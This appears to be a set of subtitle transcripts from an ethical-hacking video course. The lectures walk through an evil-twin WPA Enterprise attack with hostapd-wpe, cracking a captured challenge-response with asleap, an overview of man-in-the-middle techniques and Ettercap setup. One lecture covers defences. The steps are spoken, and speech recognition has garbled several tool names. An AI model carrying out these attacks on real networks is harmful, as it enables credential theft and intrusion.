00:06:38,720 --> 00:06:42,230
create a fake access point with WPA Enterprise.

85
00:06:42,260 --> 00:06:47,330
And I'll also be discussing why the password is going to be encrypted and how to decrypt it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,050 --> 00:00:09,090
Okay, Now that we know the methods that we can use to gain access to WPA Enterprise networks, in this

2
00:00:09,090 --> 00:00:16,050
lecture, I want to show you the more advanced method, the one where we create a fake WPA enterprise

3
00:00:16,050 --> 00:00:16,890
network.

4
00:00:17,280 --> 00:00:22,470
So the first method, like I said, it just uses a traditional fake access point.

5
00:00:22,470 --> 00:00:25,230
And I covered this before in details.

6
00:00:25,230 --> 00:00:32,250
I covered each aspect of running this attack in details so that you can adapt it to any scenario.

7
00:00:32,250 --> 00:00:36,840
And this is a perfect example where you can't use tools like Flux Zone and Wi-Fi.

8
00:00:36,870 --> 00:00:39,090
Fisher And you'll have to do it manually.

9
00:00:39,090 --> 00:00:41,520
And I covered how to do it manually before.

10
00:00:41,550 --> 00:00:45,990
That's why I'm going to be covering the more advanced method in this lecture.

11
00:00:46,780 --> 00:00:53,830
So I'm going to go to Cali and the first thing that I'm going to do is I'll need to install a modified

12
00:00:53,830 --> 00:00:55,930
version of Hostapd.

13
00:00:56,170 --> 00:01:00,670
So we use Hostapd to generate the normal fake access point.

14
00:01:00,700 --> 00:01:10,060
Now there is a modified version called Hostapd WPA, and that version of Hostapd is designed to run

15
00:01:10,060 --> 00:01:15,130
a fake access point with WPA Enterprise with Freeradius server.

16
00:01:15,640 --> 00:01:20,500
So first of all, I'm going to have to update my sources, so I'm going to do APT get update.

17
00:01:22,150 --> 00:01:25,990
Now that my sources are updated, I'm going to do apt get install.

18
00:01:26,760 --> 00:01:31,230
Followed by the program that I want to install, which is called Hostapd.

19
00:01:31,480 --> 00:01:32,400
WPA.

20
00:01:33,690 --> 00:01:35,940
So we always use apt get.

21
00:01:35,970 --> 00:01:40,380
We're just telling it to install and the package name or the program name.

22
00:01:40,380 --> 00:01:42,570
It's called host apt WP.

23
00:01:43,140 --> 00:01:49,860
I'm going to hit enter and that will automatically download the program all the needed packages and

24
00:01:49,860 --> 00:01:51,150
configure it for me.

25
00:01:53,350 --> 00:01:55,170
Okay, now that's all done.

26
00:01:55,180 --> 00:01:56,920
So I'm going to clear the screen.

27
00:01:58,480 --> 00:02:03,730
And the next thing that we want to do is very similar to what we used to do with Hostapd.

28
00:02:03,940 --> 00:02:06,550
We want to modify its configuration.

29
00:02:06,550 --> 00:02:08,890
So to do that, we're going to do Leafpad.

30
00:02:09,480 --> 00:02:16,290
Which is my text editor, and I'm going to put the location of the configuration file and that stored

31
00:02:16,290 --> 00:02:19,950
in host APD WP.

32
00:02:21,870 --> 00:02:25,380
And again host a wp.com.

33
00:02:27,570 --> 00:02:34,080
So we're doing Leafpad, which is our text editor, and then we're giving it the location of the configuration

34
00:02:34,080 --> 00:02:36,750
file for Hostapd WP.

35
00:02:37,470 --> 00:02:38,820
I'm going to hit Enter.

36
00:02:40,110 --> 00:02:44,840
And the main things that you want to make sure are set correctly is, first of all, the interface.

37
00:02:44,850 --> 00:02:46,950
This is your wireless adapter.

38
00:02:46,950 --> 00:02:49,830
So in my case it's actually called LAN zero.

39
00:02:49,860 --> 00:02:54,120
If you don't know what it's called, you have to do ifconfig, as you should know by now, and then

40
00:02:54,120 --> 00:02:55,440
you can get the name of it.

41
00:02:56,010 --> 00:02:59,310
The next thing that I want to modify is the Ssid.

42
00:02:59,790 --> 00:03:08,250
This is the name of the fake access point and it's set by default to be called Hostapd WPA.

43
00:03:09,240 --> 00:03:17,070
Now my target is called Company Network, so I'm going to call this company network as well because

44
00:03:17,070 --> 00:03:19,230
as you know, this is an evil twin attack.

45
00:03:19,230 --> 00:03:25,350
So you want your the fake access point to have the exact same name as the target access point.

46
00:03:25,350 --> 00:03:28,170
So we're calling it company network.

47
00:03:29,700 --> 00:03:34,260
You can also modify the channel in here if you want, but I'm going to keep that the same.

48
00:03:34,710 --> 00:03:38,130
And I'm actually going to leave everything else here the same.

49
00:03:38,640 --> 00:03:44,580
Now, if you scroll down, you'll actually see after this point and it says and it says it here in the

50
00:03:44,580 --> 00:03:51,060
comment, Everything that comes after here is literally just a normal hostapd configuration.

51
00:03:51,210 --> 00:03:58,980
So like I said, this is just a modified version of Hostapd, which is modified so that it can use WPA

52
00:03:59,100 --> 00:04:01,920
enterprise with free radius server.

53
00:04:02,640 --> 00:04:05,880
So I'm going to save this control s and quit it.

54
00:04:05,880 --> 00:04:07,020
Control Q.

55
00:04:07,440 --> 00:04:09,290
Okay, now we're done.

56
00:04:09,300 --> 00:04:11,100
We're ready to run the attack.

57
00:04:11,100 --> 00:04:17,670
But before we do that, like we did with Hostapd, we have to stop the network manager because it's

58
00:04:17,670 --> 00:04:19,530
managing my wireless interface.

59
00:04:19,530 --> 00:04:24,480
And if it stays running, it won't let me use it to create a fake access point.

60
00:04:24,690 --> 00:04:29,020
So I'm going to do service network manager.

61
00:04:29,020 --> 00:04:29,740
Stop.

62
00:04:31,070 --> 00:04:33,440
This will stop the network manager for me.

63
00:04:33,440 --> 00:04:38,870
And now I can run the fake access point with WPA Enterprise.

64
00:04:39,200 --> 00:04:42,800
To do that, we're going to do host WPA.

65
00:04:45,180 --> 00:04:49,660
Followed by the location of the configuration file which is in ATC.

66
00:04:50,040 --> 00:04:52,700
Host apd WPE.

67
00:04:53,640 --> 00:04:56,520
Host apd WPE conf.

68
00:04:56,970 --> 00:05:02,070
So this command is actually very similar to the host APD command that we used to use.

69
00:05:02,100 --> 00:05:07,470
You just put the name of the tool followed by the location of the configuration file.

70
00:05:08,200 --> 00:05:09,400
I'm going to hit Enter.

71
00:05:11,230 --> 00:05:15,570
And as you can see right now, it's telling me that the network is working.

72
00:05:15,580 --> 00:05:18,580
It's broadcasting under the name company network.

73
00:05:18,580 --> 00:05:23,290
And now you can just go ahead and run the authentication attack.

74
00:05:23,320 --> 00:05:28,270
As I showed you before, you can authenticate all clients or some clients.

75
00:05:28,270 --> 00:05:32,920
Again, as shown before, clients will not be able to access their network.

76
00:05:32,920 --> 00:05:34,810
They're won't be able to use their network.

77
00:05:34,810 --> 00:05:39,480
So they'll think, Oh, maybe I can just connect to the other company network.

78
00:05:39,490 --> 00:05:44,500
So let's go to a Windows machine and see what we have.

79
00:05:46,760 --> 00:05:49,190
So I have my company network in here.

80
00:05:49,430 --> 00:05:50,990
I'm going to connect to it.

81
00:05:53,630 --> 00:05:56,110
And I'm going to put my username as Zaid.

82
00:05:57,530 --> 00:06:00,830
And my password as one, two, three, four Abcd.

83
00:06:02,360 --> 00:06:04,070
I'm going to connect.

84
00:06:05,040 --> 00:06:10,410
Now, this is just a warning saying that if you expect to see this network, then connect to it.

85
00:06:10,410 --> 00:06:11,760
Otherwise, don't.

86
00:06:11,790 --> 00:06:19,530
Most people will just connect to it because like I said, WPA enterprise is usually used in large organizations,

87
00:06:19,530 --> 00:06:24,510
so people are used to see a number of routers and connecting to a number of routers.

88
00:06:24,510 --> 00:06:29,490
And if you run an authentication attack and they can't connect to their own router, then there is a

89
00:06:29,490 --> 00:06:34,710
very high chance of them trying to connect to the other router or the other to the other access point

90
00:06:34,710 --> 00:06:37,770
that has the exact same name that they're used to.

91
00:06:38,130 --> 00:06:40,470
Therefore, I'm going to click on Connect.

92
00:06:42,290 --> 00:06:46,700
Now it's saying it can't connect to this network because I actually use the wrong username and password

93
00:06:46,700 --> 00:06:47,440
anyway.

94
00:06:47,450 --> 00:06:55,340
But if we go to the Kali machine, you'll see that we captured the username, we captured the challenge

95
00:06:55,340 --> 00:06:57,470
and we captured the response.

96
00:06:57,890 --> 00:07:02,870
Now I know this is not the password that I put, so you still can't see one, two, three, four Abcd

97
00:07:03,290 --> 00:07:06,170
and that's because the password is encrypted.

98
00:07:06,260 --> 00:07:13,760
That's why I said the basic evil twin method that we showed before has an advantage over this method

99
00:07:13,760 --> 00:07:18,020
because the password will be sent in plain text over Http.

100
00:07:18,680 --> 00:07:23,840
The problem with that method was the login screen wasn't very convincing.

101
00:07:23,870 --> 00:07:31,910
With this method you'll get a proper system login box because we are implementing a proper WPA enterprise

102
00:07:31,910 --> 00:07:34,370
network so there is nothing fake about it.

103
00:07:34,400 --> 00:07:42,240
The only problem is because this is a proper WPA enterprise network, the password will be sent based

104
00:07:42,240 --> 00:07:49,200
on the authentication method used, which is a challenge response method where the router sends a challenge

105
00:07:49,200 --> 00:07:52,920
and then the client sends a response based on that.

106
00:07:53,130 --> 00:07:57,570
Now in the next lecture, I'm going to talk more about this and I'm going to show you how to crack the

107
00:07:57,570 --> 00:08:00,920
response and get the key for the network.

108
00:08:00,930 --> 00:08:03,400
But for now, our attack is done.

109
00:08:03,420 --> 00:08:07,350
We managed to capture the username and the hash for that password.

110
00:08:07,350 --> 00:08:10,650
And in the next lecture, I'm going to show you how to crack that password.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,180 --> 00:00:01,720
Okay.

2
00:00:01,720 --> 00:00:08,170
Now, in the last video, when the user logged in to our network and put the username and password,

3
00:00:08,200 --> 00:00:10,570
we only captured the username.

4
00:00:10,990 --> 00:00:15,490
We didn't get the password, but instead we got something called the challenge.

5
00:00:15,520 --> 00:00:17,980
And we also got a response.

6
00:00:18,670 --> 00:00:24,430
Now, the reason for this is because, like I said, the network that we created, the fake network

7
00:00:24,430 --> 00:00:29,620
that we created, uses a proper WPA enterprise authentication.

8
00:00:30,220 --> 00:00:36,010
Therefore, when a user tries to connect to that network and authenticate, they'll use what's known

9
00:00:36,010 --> 00:00:38,830
as a challenge response authentication.

10
00:00:39,130 --> 00:00:44,830
So in order to understand what we mean by a challenge and a response here, let's have a look on this

11
00:00:44,830 --> 00:00:46,840
very simple diagram that I made.

12
00:00:47,650 --> 00:00:54,100
I'm trying to keep this as simple as possible so that we don't get carried away talking about algorithms,

13
00:00:54,100 --> 00:00:58,600
encryption and all of that because that on its own needs a full course.

14
00:00:59,140 --> 00:01:05,390
So basically what happens when a client tries to connect to a network that uses WPA enterprise?

15
00:01:05,410 --> 00:01:09,010
We said this is managed through a Radius server.

16
00:01:09,460 --> 00:01:13,780
So what happens is the client sends a request saying, I want to connect.

17
00:01:13,990 --> 00:01:17,950
The server says, okay, no problem, solve this challenge for me.

18
00:01:17,950 --> 00:01:21,220
So it gives the client a challenge to solve.

19
00:01:21,220 --> 00:01:23,420
And this is what you see in here.

20
00:01:23,440 --> 00:01:29,350
So we can see this is the challenge that the server that we are running because in this case we have

21
00:01:29,350 --> 00:01:30,640
a fake access point.

22
00:01:30,640 --> 00:01:35,380
So that's the challenge that the server sent to the client to solve.

23
00:01:36,180 --> 00:01:39,840
The client goes ahead and solves the challenge.

24
00:01:39,840 --> 00:01:40,530
It solves.

25
00:01:40,530 --> 00:01:46,510
It solves it by encrypting the challenge using the password that you put.

26
00:01:46,530 --> 00:01:52,000
So basically, the password that you put in the login box will never be sent to the server.

27
00:01:52,020 --> 00:02:00,180
What happens is that password is used in a certain manner so that it converts this challenge, encrypts

28
00:02:00,180 --> 00:02:07,950
it, and converts it into a response that the radius server will be able to understand and verify if

29
00:02:07,950 --> 00:02:09,540
the password was correct.

30
00:02:09,960 --> 00:02:15,870
So you say I want to connect server says no problem, solve the challenge for me.

31
00:02:15,900 --> 00:02:21,660
Challenge is solved based on the password that you enter and it's sent to the radius server.

32
00:02:23,030 --> 00:02:27,530
Now, when we look at this, we can see the challenge and the response sent.

33
00:02:28,010 --> 00:02:33,260
Now this challenge is encrypted using net and version one.

34
00:02:33,800 --> 00:02:41,300
Now, this is a strong encryption and for us, we can't actually just encrypt it based on the response

35
00:02:41,300 --> 00:02:42,080
on its own.

36
00:02:42,080 --> 00:02:48,320
So we actually need to use the response and the challenge and we'll also need to run a dictionary attack.

37
00:02:49,140 --> 00:02:55,240
The way this dictionary attack is going to work is it's going to go over a list of a lot of words.

38
00:02:55,260 --> 00:02:57,580
It's going to take each one of these words.

39
00:02:57,600 --> 00:03:04,290
It's going to try to create a response based on these words and compare it to this response.

40
00:03:04,500 --> 00:03:11,400
If the response generated using the word in the word list is correct, then the word used to generate

41
00:03:11,400 --> 00:03:13,740
that response is the password.

42
00:03:13,770 --> 00:03:16,440
Otherwise, it will try the next word.

43
00:03:17,190 --> 00:03:22,260
So again, the way the word list attack is going to work is it's going to go through a list of a lot

44
00:03:22,260 --> 00:03:24,720
of passwords that we're going to give to the program.

45
00:03:24,840 --> 00:03:27,360
It's going to take each one of these passwords.

46
00:03:27,360 --> 00:03:33,870
It's going to apply the formula and try to solve the challenge to generate a response.

47
00:03:34,050 --> 00:03:38,580
The response generated is going to be compared to this response right here.

48
00:03:38,850 --> 00:03:44,760
If the response is valid, then the password used to generate it is the valid password.

49
00:03:44,790 --> 00:03:47,760
Otherwise it's going to try the next password.

50
00:03:48,420 --> 00:03:54,300
Now there is a number of tools that can run a dictionary attack against net a.l.m hashes.

51
00:03:54,540 --> 00:03:58,590
The one that I want to use is called asleep.

52
00:03:59,640 --> 00:04:05,790
Now you can use Hashcat and John for that, but this tool is just simpler and that's why I'm going to

53
00:04:05,790 --> 00:04:06,540
go for it.

54
00:04:07,200 --> 00:04:11,310
Now, before using this tool, let's have a look on its help menu.

55
00:04:11,310 --> 00:04:14,850
So we're going to do ASL, EAP Help.

56
00:04:17,400 --> 00:04:23,640
So you can see the options here are very simple and you can see the usage is you literally just type

57
00:04:23,640 --> 00:04:26,160
in the tool name followed by the options.

58
00:04:26,310 --> 00:04:31,140
So first of all, let's type in the name of the tool which is asleep.

59
00:04:31,890 --> 00:04:37,590
Then we want to use the dash option to give the challenge.

60
00:04:37,710 --> 00:04:39,810
So we have the challenge in here.

61
00:04:40,740 --> 00:04:42,180
I'm going to copy it.

62
00:04:43,580 --> 00:04:45,200
And I'm going to do Dash C.

63
00:04:47,300 --> 00:04:48,590
And put the challenge.

64
00:04:49,640 --> 00:04:54,620
Next option that I want to use is the response, which is R and here.

65
00:04:54,950 --> 00:04:56,900
So again, I'm going to do Dash.

66
00:04:57,980 --> 00:05:04,040
Capital R, and then I'm going to put the response that we got, which is this one in here.

67
00:05:04,580 --> 00:05:08,180
So I'm just going to copy it and paste it.

68
00:05:09,800 --> 00:05:14,900
Finally, we want to specify a dictionary to use to crack this hash.

69
00:05:14,900 --> 00:05:17,330
And to do that, we're going to do dash W.

70
00:05:18,190 --> 00:05:24,190
And I've already created a dictionary using Crunch so you can create your own dictionary or download

71
00:05:24,190 --> 00:05:25,630
the dictionary online.

72
00:05:26,050 --> 00:05:29,410
The dictionary that I have is stored in root.

73
00:05:30,150 --> 00:05:32,280
And it's called wordlist.

74
00:05:33,510 --> 00:05:34,230
And that's it.

75
00:05:34,230 --> 00:05:37,170
So the command is going to be asleep.

76
00:05:37,560 --> 00:05:44,130
We're doing Dash C to give the challenge, followed by Dash R to give the response.

77
00:05:44,130 --> 00:05:46,590
And finally we're given the word list.

78
00:05:47,160 --> 00:05:51,030
So again, what's this still going to do is it's going to open this word list.

79
00:05:51,060 --> 00:05:59,430
It's going to go on it word by word, generate a response based on this challenge and compare the response

80
00:05:59,430 --> 00:06:01,550
with this response right here.

81
00:06:01,560 --> 00:06:07,560
If the response generated from the word in the word list is valid, then that word is the password.

82
00:06:07,590 --> 00:06:10,170
Otherwise, it's going to try the next word.

83
00:06:11,220 --> 00:06:13,140
So I'm going to hit Enter.

84
00:06:14,450 --> 00:06:17,750
And let this run until it gets me the password.

85
00:06:17,750 --> 00:06:22,910
And as you can see, this was quite fast and it got me the password right here.

86
00:06:23,000 --> 00:06:29,000
The password is one, two, three, four, A, B, C, D, And that's actually the password that I used.

87
00:06:29,090 --> 00:06:35,510
So right now we have the username, which is Z and the password, which is one, two, three, four

88
00:06:35,540 --> 00:06:36,380
Abcd.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,560 --> 00:00:01,100
All right.

2
00:00:01,130 --> 00:00:05,420
Now, we've seen some pretty scary stuff in this section, in this lecture.

3
00:00:05,420 --> 00:00:11,000
I want to talk about how to prevent some of these attacks or secure your networks from them.

4
00:00:11,600 --> 00:00:15,170
So the first thing that we spoke about was captive portals.

5
00:00:15,170 --> 00:00:19,800
And we seen how we can gain access to these networks using three methods.

6
00:00:19,820 --> 00:00:25,820
And even if the first two methods didn't work, then the third will rely on the users and will gain

7
00:00:25,820 --> 00:00:26,600
access.

8
00:00:27,760 --> 00:00:32,660
As shown that proves that captive portals are not secure at all.

9
00:00:32,680 --> 00:00:39,490
So in order to get the functionality of a captive portal but stay secure, the best thing to do is to

10
00:00:39,490 --> 00:00:47,590
use WPA Enterprise with a Radius server and then give each user an individual username and password.

11
00:00:47,770 --> 00:00:51,340
This way you can still prevent some people from connecting.

12
00:00:51,340 --> 00:00:53,650
You can still disable some of the passwords.

13
00:00:54,310 --> 00:00:58,510
You can control these users and see each what each one of them is doing.

14
00:00:58,510 --> 00:01:06,070
But at the same time, the people authenticate using the WPA or WPA two authentication procedure.

15
00:01:06,070 --> 00:01:08,410
So it's much more secure.

16
00:01:08,440 --> 00:01:13,810
The data is going to be sent encrypted so people that are not connected to the network cannot sniff

17
00:01:13,840 --> 00:01:14,110
it.

18
00:01:14,140 --> 00:01:20,500
They can't just connect and do a spoofing and at the same time you're getting the same functionality

19
00:01:20,500 --> 00:01:22,900
that you'll get from a captive portal.

20
00:01:23,020 --> 00:01:28,720
Next, we've seen how easy it is to crack web with SQL, with shared key authentication.

21
00:01:28,720 --> 00:01:34,090
So it goes without saying don't use web regardless of how you implement it, even if you think that

22
00:01:34,090 --> 00:01:39,250
you implemented it in a more secure manner, just don't use web period.

23
00:01:39,490 --> 00:01:47,440
Next is WP and we've seen how we can force some routers to cough their password or their pin.

24
00:01:48,190 --> 00:01:51,340
Again, there are secure ways of implementing WP.

25
00:01:51,550 --> 00:01:56,540
If you disable push button authentication and lock after a number of failed attempts.

26
00:01:56,540 --> 00:02:02,510
But again, if you want to be secure, just disable WP, that'll just make River not work at all.

27
00:02:03,410 --> 00:02:06,740
Then we see in more advanced word list attacks.

28
00:02:06,740 --> 00:02:09,770
So if WEP is not used, WPA is enabled.

29
00:02:09,770 --> 00:02:16,790
We're talking about you using WPA or WPA two now, and the only way to gain access to your network is

30
00:02:16,790 --> 00:02:18,800
using a word list attack.

31
00:02:18,800 --> 00:02:24,770
And we see an advanced word list attacks where we can use big words, lists and save and restore our

32
00:02:24,770 --> 00:02:28,850
progress and use the GPU for cracking to make it faster.

33
00:02:28,850 --> 00:02:32,540
Now, all of these are still word list attacks.

34
00:02:32,540 --> 00:02:40,100
So if you use a long password, say minimum of 16 characters with letters, numbers and symbols, then

35
00:02:40,100 --> 00:02:43,430
it's going to be very, very difficult to get your password.

36
00:02:43,430 --> 00:02:45,970
Even using the methods that I showed you right now.

37
00:02:45,980 --> 00:02:51,980
Obviously, the longer the password, the harder it is to get the key for it because it's a word list

38
00:02:51,980 --> 00:02:52,460
attack.

39
00:02:52,460 --> 00:02:56,930
So the key has to be there in the word list that the hacker is using.

40
00:02:58,270 --> 00:03:05,550
Now, the last method that we see and we said that this is the last resort is using an evil twin attack.

41
00:03:05,560 --> 00:03:10,300
And we see how we can use that to gain access to WPA or WPA two networks.

42
00:03:10,300 --> 00:03:15,010
And we also seen how to use that to gain access to captive portals.

43
00:03:15,520 --> 00:03:21,820
Now, in both of these methods, we're relying on the humans, on the users that use the network.

44
00:03:21,820 --> 00:03:29,140
So when it goes down to that, then there's nothing you can do in terms of the software or the hardware.

45
00:03:29,170 --> 00:03:33,250
The hacker is literally exploiting the people that use the network.

46
00:03:33,250 --> 00:03:37,270
So the only thing you can do in this case is educate your users.

47
00:03:37,270 --> 00:03:44,170
So if you have a small group of users, you can just have a talk and tell them, Here, look, this

48
00:03:44,170 --> 00:03:45,700
is an attack that can be used.

49
00:03:45,700 --> 00:03:46,960
Be careful from it.

50
00:03:46,960 --> 00:03:51,940
If you get the authenticated or disconnected from your network, make sure when you connect that, you

51
00:03:51,970 --> 00:03:58,820
connect to the same network and make sure that the network you're connecting to is actually using encryption.

52
00:03:58,820 --> 00:04:00,650
So it's not an open network.

53
00:04:00,740 --> 00:04:07,100
Also, tell them never enter the network key in a web interface because as we've seen when we're running

54
00:04:07,100 --> 00:04:12,260
the evil twin attack, we always ask for the password in a web interface.

55
00:04:12,800 --> 00:04:20,330
So make sure that your users know they should never enter the key in a web interface, and if they already

56
00:04:20,330 --> 00:04:25,850
entered the key, they'll never be asked for it again unless they clicked on forgot the network, which

57
00:04:25,850 --> 00:04:26,780
they should know.

58
00:04:27,170 --> 00:04:32,120
So to summarize, if you want to secure your network from the gaining access attacks that we've seen

59
00:04:32,120 --> 00:04:35,270
so far, First, don't use captive portals.

60
00:04:35,270 --> 00:04:37,100
Implement WPA enterprise.

61
00:04:37,100 --> 00:04:47,210
If you want a similar functionality to never use Web three Disable WPA for use WPA or WPA two with a

62
00:04:47,210 --> 00:04:52,310
complex password of letters, characters, numbers and symbols.

63
00:04:52,460 --> 00:04:53,540
Five.

64
00:04:53,570 --> 00:04:59,150
Educate your users to make sure they won't be victims of a social engineering attack.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 9: Post Connection Attacks

1
00:00:00,970 --> 00:00:06,670
Okay, Now that you know how to gain access to networks, even if they use encryption and even if they

2
00:00:06,670 --> 00:00:13,750
implement a large number of security features In this section, we're going to talk about the post connection

3
00:00:13,750 --> 00:00:14,290
attacks.

4
00:00:14,290 --> 00:00:18,190
So the attacks that you can do after you connect to a network.

5
00:00:18,400 --> 00:00:24,670
Now, all of the attacks that we're going to talk about here will work against Wi-Fi and Ethernet or

6
00:00:24,670 --> 00:00:25,790
wired networks.

7
00:00:25,810 --> 00:00:30,160
You just need to make sure that you're actually connected to that network.

8
00:00:30,310 --> 00:00:35,620
So throughout this section, I'm going to be running some of the attacks against a wireless network

9
00:00:35,620 --> 00:00:42,010
after connecting to it, or I'm going to be running it against the virtual Nat network, which acts

10
00:00:42,010 --> 00:00:47,980
exactly as an Ethernet network just to prove to you that this will work against both Wi-Fi and wired

11
00:00:47,980 --> 00:00:48,670
networks.

12
00:00:50,390 --> 00:00:56,780
So in the first subsection of this section, we're going to visit some basics and I'm going to show

13
00:00:56,780 --> 00:01:04,820
you how to manually run an ARP spoofing attack, become the man in the middle, sniff data, bypass

14
00:01:04,820 --> 00:01:12,710
https, do DNS spoofing and more cool stuff that you might already know how to do using scripts such

15
00:01:12,710 --> 00:01:14,120
as Man in the Middle F.

16
00:01:14,660 --> 00:01:21,590
Now the word manually is highlighted here because I want you to know how to do this independent of scripts

17
00:01:21,590 --> 00:01:23,180
that will do everything for you.

18
00:01:23,180 --> 00:01:28,460
Because once you know how to do stuff manually, if scripts fail, then you'll be able to fix it or

19
00:01:28,460 --> 00:01:30,820
know where it's going wrong and fix that.

20
00:01:30,830 --> 00:01:37,670
And you'll also be able to kind of take out each of these components and plug it into your own attack

21
00:01:37,670 --> 00:01:41,150
and then and then run your more powerful attack.

22
00:01:42,210 --> 00:01:47,550
I will also show you how to bypass some security features if they're implemented on the router side

23
00:01:47,550 --> 00:01:52,800
and still be able to run your ARP spoofing without triggering any alarm.

24
00:01:53,400 --> 00:01:57,450
Now, this is all going to be the first subsection of this section.

25
00:01:57,450 --> 00:02:03,960
In the next subsection, I'm going to show you how to analyze data flows and start building up your

26
00:02:03,960 --> 00:02:04,650
own attacks.

27
00:02:04,650 --> 00:02:09,870
So if you have an idea of an attack and there is no tool that does that attack for you, I'm going to

28
00:02:09,870 --> 00:02:16,140
show you how to, first of all, analyze, see what happens when someone does something or how do you

29
00:02:16,140 --> 00:02:17,760
want this attack to be triggered?

30
00:02:17,760 --> 00:02:22,320
And then I'm going to show you how to run this attack and get it to work.

31
00:02:22,320 --> 00:02:27,420
So we're going to be, first of all, showing you some attacks that man in the middle have already implements,

32
00:02:27,420 --> 00:02:31,560
such as injecting JavaScript or modifying HTML code.

33
00:02:31,560 --> 00:02:33,630
But you're going to be doing that manually.

34
00:02:33,630 --> 00:02:39,210
You're going to be creating that attack manually so you won't be dependent on tools such as Man in the

35
00:02:39,210 --> 00:02:46,390
Middle F and then in the last subsection of this section is where everything clicks together.

36
00:02:46,390 --> 00:02:53,020
So I'm actually going to show you how to write your own scripts to run your own attacks.

37
00:02:53,020 --> 00:02:57,400
So we're going to be doing attacks that there is no tools around that do it.

38
00:02:57,430 --> 00:03:02,740
We're going to show you how to, first of all, think of an attack and then I'm going to show you how

39
00:03:02,740 --> 00:03:08,680
to write a script that will execute this attack for you so you won't have to do it manually every time

40
00:03:08,680 --> 00:03:09,580
you want to run it.

41
00:03:10,720 --> 00:03:17,050
I'm going to be talking about each component and each part of creating your own attack separately.

42
00:03:17,050 --> 00:03:22,360
So we're going to be talking about analyzing data flows and analyzing what happens when when someone

43
00:03:22,360 --> 00:03:24,130
does something on the network.

44
00:03:24,160 --> 00:03:28,450
We're going to talk about how to come up with an attack, and then we're going to talk about how to

45
00:03:28,450 --> 00:03:31,210
test it and implement that attack.

46
00:03:32,510 --> 00:03:38,240
So by the end of this section, you're going to be able to implement any attacks that you think of,

47
00:03:38,240 --> 00:03:43,940
even if there is no tools that do it for you, you're going to be able to sit down, analyze and write

48
00:03:43,940 --> 00:03:46,490
and build up your own attack.

49
00:03:46,670 --> 00:03:52,670
So this is crucial because in a lot of scenarios you might have an idea and this idea will actually

50
00:03:52,670 --> 00:03:57,410
work, but you might not have the skills to put it to make it work practically.

51
00:03:57,410 --> 00:04:01,760
So by the end of this course, you'll be able to do such things.

52
00:04:01,760 --> 00:04:07,250
And I'm actually, as an example, we're going to be building a tool that's going to create a Trojan

53
00:04:07,280 --> 00:04:11,510
out of any file that any person downloads in the same network.

54
00:04:11,510 --> 00:04:15,140
So there is nothing around at the Internet that does that.

55
00:04:15,140 --> 00:04:20,840
And this just goes to show you how you can use the information here to build up any attack that you

56
00:04:20,840 --> 00:04:21,770
can think of.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,770 --> 00:00:04,580
In this lecture, I'd like to talk about a tool called Ettercap.

2
00:00:05,030 --> 00:00:11,090
Ettercap is a man in the middle framework that's designed to allow you to run a number of man in the

3
00:00:11,090 --> 00:00:12,140
middle attacks.

4
00:00:12,140 --> 00:00:13,970
So it has a built in sniffer.

5
00:00:14,000 --> 00:00:19,610
It supports a number of plugins to do DNS spoofing and all of that and more features.

6
00:00:20,450 --> 00:00:22,100
I know what you're thinking right now.

7
00:00:22,130 --> 00:00:28,580
I've already showed you how to run ARP spoofing and ARP poisoning attacks using ARP spoofing and Man

8
00:00:28,580 --> 00:00:29,660
in the Middle EFF.

9
00:00:29,780 --> 00:00:35,480
I've also showed you how to start a sniffer and capture data using man in the middle and wireshark.

10
00:00:35,480 --> 00:00:37,820
So why do we need another tool?

11
00:00:37,970 --> 00:00:43,190
Well, the reason why I'm showing you Ettercap right now is because I want to use it later on in the

12
00:00:43,190 --> 00:00:45,890
course to do more advanced stuff.

13
00:00:45,890 --> 00:00:50,060
But for now, before I could do that, I need to cover the basics.

14
00:00:50,630 --> 00:00:54,830
Also, I know a lot of people face issues with man in the middle life.

15
00:00:54,860 --> 00:00:57,470
Me personally, I don't really have any issues with it.

16
00:00:57,470 --> 00:00:58,860
Usually it works well for me.

17
00:00:58,880 --> 00:01:03,690
You just want to make sure that all the libraries are installed and up to date.

18
00:01:04,050 --> 00:01:09,840
I know people face issues with man in the middle life, so if you do, this will be a great alternative.

19
00:01:09,870 --> 00:01:17,130
It doesn't have as much features as man in the middle F, but it can be used to do everything that man

20
00:01:17,130 --> 00:01:19,650
in the middle F does and we'll see how to do that.

21
00:01:19,680 --> 00:01:23,820
Basically, it's a simpler tool, but it's very, very reliable.

22
00:01:24,480 --> 00:01:29,730
So in this lecture, I'm going to focus on basic things just to talk about the tool and see its basic

23
00:01:29,760 --> 00:01:32,220
usage and maybe even in the next lecture.

24
00:01:32,220 --> 00:01:37,500
But after that I want to dive in into more advanced stuff and that's why I'm covering this tool.

25
00:01:38,470 --> 00:01:41,260
So for the start, I have my terminal here.

26
00:01:41,290 --> 00:01:47,200
The tool come in pre-installed with Kali Linux, but before we can use it, there is one thing we need

27
00:01:47,200 --> 00:01:51,610
to modify in its config file to open the config file.

28
00:01:51,610 --> 00:01:58,180
As usual we do leafpad followed by the location of the config file and it's in e.t.c..

29
00:01:58,720 --> 00:02:01,750
Ettercap etter dconf.

30
00:02:02,990 --> 00:02:08,460
So we're only doing leafpad followed by the location of the config file.

31
00:02:08,480 --> 00:02:09,830
I'm going to hit enter.

32
00:02:11,710 --> 00:02:17,350
And as you can see, you get a detailed configuration file where you can pretty much modify every single

33
00:02:17,350 --> 00:02:18,760
aspect of the program.

34
00:02:19,630 --> 00:02:27,280
So what we need to modify, if we just go down, you'll see in here it's telling you if you're using

35
00:02:27,280 --> 00:02:28,330
IP chains.

36
00:02:29,560 --> 00:02:31,720
And if you're using IP tables.

37
00:02:31,720 --> 00:02:37,930
So we are using IP tables and in your case, you'll see there is a hash before these two lines.

38
00:02:37,930 --> 00:02:41,890
So you want to make sure that you remove the hash like I did in here.

39
00:02:42,930 --> 00:02:51,090
One more thing that you want to modify is the Uuid in here and you want to set that to zero for both.

40
00:02:52,530 --> 00:02:56,820
Now, this might not give you an issue, but it will show you warnings.

41
00:02:56,820 --> 00:02:59,100
So it's better just to modify that.

42
00:02:59,400 --> 00:03:00,390
And now I'm done.

43
00:03:00,390 --> 00:03:02,940
I'm going to control S To save control.

44
00:03:02,970 --> 00:03:04,260
Q To quit.

45
